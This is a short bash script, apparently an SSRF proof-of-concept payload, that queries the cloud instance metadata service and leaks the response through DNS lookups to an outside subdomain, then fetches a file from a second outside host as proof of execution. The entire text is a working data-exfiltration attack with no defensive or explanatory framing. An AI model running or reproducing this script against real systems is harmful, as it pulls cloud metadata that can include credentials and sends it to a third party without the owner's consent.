#!/bin/bash
echo "🎯 SSRF EXECUTED AT $(date)"

# DNS Blind SSRF (Replace with YOUR fresh subdomain)
METADATA=$(curl -s http://169.254.169.254/latest/meta-data/ 2>/dev/null || echo "no-meta")
nslookup "${METADATA// /.}".d79c0b3d.digimg.store

# HTTP Proof
curl https://norosec.xyz/ssrf-echo.txt
echo "✅ SSRF PROOF"
